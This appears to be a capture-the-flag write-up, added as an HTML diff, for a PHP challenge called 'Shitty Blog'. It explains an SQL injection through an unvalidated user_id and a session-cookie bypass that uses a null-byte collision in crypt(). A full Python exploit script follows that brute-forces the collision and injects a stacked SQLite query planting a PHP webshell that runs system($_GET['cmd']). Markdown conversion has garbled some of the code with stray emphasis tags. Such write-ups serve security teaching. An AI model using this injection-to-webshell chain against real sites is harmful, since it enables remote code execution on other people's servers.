@@ -1,0 +1,194 @@
+<h2>Shitty Blog</h2>
+
+<p>{% file src="../.gitbook/assets/shitty blog 🤎-a6c0b8b672817005.tar.xz" %}</p>
+
+<p>We could see that when inserting entries, the <code>user_id</code> is not validated. This is also directly substituted into the SQL query, allowing an SQL injection.</p>
+
+<p>Interestingly, <code>get_user</code> uses <code>$db-&gt;query</code>, while <code>delete_entry</code> uses <code>$db-&gt;exec</code>. The <code>exec()</code> function allows multiline (stacked) queries, allowing us to use <a href="https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/">this RCE payload</a> to upload a webshell.</p>
+
+<p>```php
+function get<em>user($db, $user</em>id) : string {
+    foreach($db->query("SELECT name FROM user WHERE id = {$user_id}") as $user) {
+        return $user['name'];
+    }
+    return 'me';
+}</p>
+
+<p>...</p>
+
+<p>function delete<em>entry($db, $entry</em>id, $user<em>id) {
+    $db->exec("DELETE from entry WHERE {$user</em>id} &lt;&gt; 0 AND id = {$entry_id}");
+}</p>
+
+<p>...</p>
+
+<p>if(isset($<em>POST['content'])) {
+    insert</em>entry($db, htmlspecialchars($_POST['content']), $id);</p>
+
+<pre><code>header('Location: /');
+exit;
+</code></pre>
+
+<p>}</p>
+
+<p>$entries = get_entries($db);</p>
+
+<p>if(isset($<em>POST['delete'])) {
+    foreach($entries as $key =&gt; $entry) {
+        if($</em>POST['delete'] === $entry['id']){
+            delete<em>entry($db, $entry['id'], $entry['user</em>id']);
+            break;
+        }
+    }</p>
+
+<pre><code>header('Location: /');
+exit;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>The difficulty lies in bypassing the following validation to insert a custom <code>$id</code> from the <code>session</code> cookie.</p>
+
+<p>```php
+$secret = 'SECRET<em>PLACEHOLDER';
+$salt = '$6$'.substr(hash</em>hmac('md5', $<em>SERVER['REMOTE</em>ADDR'], $secret), 16).'$';</p>
+
+<p>if(! isset($<em>COOKIE['session'])){
+    $id = random</em>int(1, PHP<em>INT</em>MAX);
+    $mac = substr(crypt(hash<em>hmac('md5', $id, $secret, true), $salt), 20);
+}
+else {
+    $session = explode('|', $</em>COOKIE['session']);
+    if( ! hash<em>equals(crypt(hash</em>hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
+        exit();
+    }
+    $id = $session[0];
+    $mac = $session[1];
+}
+```</p>
+
+<p>Notice that in <code>hash_hmac()</code>, <code>binary=true</code> is set but <code>crypt()</code> is <a href="https://www.reddit.com/r/PHP/comments/t0qzl/is_this_a_bug_shouldnt_crypt_be_binary_safe/">not binary safe</a> - the function only processes the input string up to a null byte terminator!</p>
+
+<p>It would therefore be trivial to find two <code>$id</code> numbers that produce the same <code>$mac</code> by bruteforcing - this happens when <code>hash_hmac()</code> returns a result starting with <code>\x00</code>.</p>
+
+<p>```python
+def find<em>collision():
+    """
+    Find an instance where two IDs produce '\x00' at the beginning of the hash</em>hmac() output,
+    resulting in crypt(), which is a non binary safe function, returning the same value.</p>
+
+<pre><code>Returns the MAC that corresponds to this result.
+"""
+results = {}
+
+while True:
+    r = requests.get(URL)
+    cookie = r.headers['Set-Cookie'].split('=')[1]
+    cookie = urllib.parse.unquote(cookie)
+
+    id, mac = cookie.split('|')
+    print(id, mac)
+
+    if mac in results:
+        return mac
+
+    results[mac] = id
+</code></pre>
+
+<p>```</p>
+
+<p>Since this <code>$mac</code> corresponds to the case where <code>hash_hmac()</code> returns a result starting with <code>\x00</code>, we would be able to bypass the following validation by using this <code>$mac</code> value in our session cookie, while changing the <code>$id</code> value in our session cookie until its HMAC starts with <code>\x00</code>.</p>
+
+<p><code>php
+hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])
+</code></p>
+
+<p>This can be done by appending different things to the end of the payload (after an SQL comment) until we get a valid value. This value will produce a <code>crypt()</code> result corresponding to the <code>$mac</code> found previously.</p>
+
+<p>```python
+def find<em>exploit</em>collision(exploit, mac):
+    """
+    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
+    the hash<em>hmac() output begins with '\x00'.
+    """
+    i = 0
+    exploit = urllib.parse.quote</em>plus(exploit).replace('+', ' ')
+    while True:</p>
+
+<pre><code>    print(i)
+
+    tmp = exploit + str(i)
+
+    # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
+    r = requests.get(URL, cookies={'session': tmp + '|' + mac})
+    if "My shitty Blog" in r.text:
+        return tmp
+
+    i += 1
+</code></pre>
+
+<p>```</p>
+
+<p>The full script to generate the exploit payload is as follows:</p>
+
+<p>```python
+import requests
+import urllib.parse</p>
+
+<p>URL = "http://65.108.176.96:8888/"</p>
+
+<p>def find<em>collision():
+    """
+    Find an instance where two IDs produce '\x00' at the beginning of the hash</em>hmac() output,
+    resulting in crypt(), which is a non binary safe function, returning the same value.</p>
+
+<pre><code>Returns the MAC that corresponds to this result.
+"""
+results = {}
+
+while True:
+    r = requests.get(URL)
+    cookie = r.headers['Set-Cookie'].split('=')[1]
+    cookie = urllib.parse.unquote(cookie)
+
+    id, mac = cookie.split('|')
+    print(id, mac)
+
+    if mac in results:
+        return mac
+
+    results[mac] = id
+</code></pre>
+
+<p>def find<em>exploit</em>collision(exploit, mac):
+    """
+    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
+    the hash<em>hmac() output begins with '\x00'.
+    """
+    i = 0
+    exploit = urllib.parse.quote</em>plus(exploit).replace('+', ' ')
+    while True:</p>
+
+<pre><code>    print(i)
+
+    tmp = exploit + str(i)
+
+    # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
+    r = requests.get(URL, cookies={'session': tmp + '|' + mac})
+    if "My shitty Blog" in r.text:
+        return tmp
+
+    i += 1
+</code></pre>
+
+<h1>mac = find_collision()</h1>
+
+<p>mac = "QAhL.MoHxwRM3Bt/pMvSrjxnRCAxaim7VAtMVwCnNgsjtlWO3AKBcd1WY9NYPrxtUrTluTorPK4laJKcJydWB0"
+print(f"Found MAC: {mac}")</p>
+
+<p>exploit = find<em>exploit</em>collision("20 or 1=1; ATTACH DATABASE '/var/www/html/data/nice.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>');#", mac)
+print(f"Found exploit: {exploit}")</p>
+
+<p>print(f"Set session cookie: {exploit}|{mac}")
+```</p>
